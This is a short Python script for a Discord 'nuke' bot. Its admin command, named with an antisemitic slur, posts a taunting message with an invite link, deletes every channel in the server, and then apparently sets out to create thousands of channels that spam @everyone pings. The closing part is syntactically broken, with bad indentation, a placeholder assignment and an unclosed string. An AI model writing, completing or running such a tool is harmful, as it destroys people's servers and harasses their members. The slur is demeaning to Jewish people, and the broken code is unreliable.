import discord
from discord.ext import commands
import os

TOKEN = os.environ["DISCORD_TOKEN"]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
@bot.command()
@commands.has_permissions(administrator=True)
async def jew(ctx):
    await ctx.send("""
your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKdD
.
""")

    # Delete existing channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # Create new channels
      for i in range(2000, 5000):
    channel = ...
    message = """
    text
    "@everyone @here @everyone @everyone @everyone @everyone"
    await channel.send(message)
